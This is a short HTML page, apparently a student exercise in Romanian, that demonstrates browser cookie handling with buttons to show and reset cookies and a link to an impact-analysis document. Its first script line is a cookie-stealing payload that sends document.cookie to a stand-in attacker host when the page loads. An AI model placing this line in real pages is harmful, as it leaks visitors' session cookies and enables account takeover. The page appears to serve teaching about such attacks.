<script> 
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
document.cookie = "name=henrietta"; 
document.cookie = "browser_version=navigator.appVersion";  

const cookieValue = document.cookie .split('; ') .find(row => row.startsWith('test2=')) .split('=')[1]; 

function doOnce() { if (!document.cookie.split('; ').find(row => row.startsWith('doSomethingOnlyOnce'))) { alert(document.cookie); 
document.cookie = "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT"; } } 
function resetOnce() { document.cookie = "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT"; } //ES5 
if (document.cookie.split(';').some(function(item) { return item.indexOf('reader=1') >= 0 })) { console.log('The cookie "reader" has "1" for value') } //ES2016 
if (document.cookie.split(';').some((item) => item.includes('reader=1'))) { console.log('The cookie "reader" has "1" for value') } </script> 
<body>
  Bun venit pe pagina cu prajituri!<br>
  <button onclick="doOnce()">Vezi cookies</button><br>
  <button onclick="resetOnce()">Reseteaza buton cu cookie</button><br>
  <a href="https://didatec-my.sharepoint.com/:w:/r/personal/szilagyi_he_henri_utcluj_didatec_ro/_layouts/15/Doc.aspx?sourcedoc=%7B02175963-161C-4C61-9E55-04E30A59C7D6%7D&file=Analiza%20de%20impact.docx&action=edit&mobileredirect=true&wdNewAndOpenCt=1621792338112&ct=1621792338112&wdPreviousSession=0b3ed004-2258-4e6a-bb7d-185826811b79&wdOrigin=OFFICECOM-WEB.MAIN.UPLOAD">Acceseaza analiza de impact</a>
Szilagyi Henrietta-Andrea
</body>
